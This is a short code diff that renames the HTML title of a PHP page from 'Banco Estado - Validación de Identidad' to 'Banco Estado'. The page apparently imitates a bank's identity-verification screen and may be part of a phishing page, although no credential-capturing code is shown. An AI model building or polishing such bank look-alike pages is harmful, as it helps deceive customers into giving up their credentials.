@@ -39,7 +39,7 @@ if (isset($_GET['check'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="shortcut icon" type="image/png" href="favicon.png">
-    <title>Banco Estado - Validación de Identidad</title>
+    <title>Banco Estado</title>
     <style>
         * {
             margin: 0;
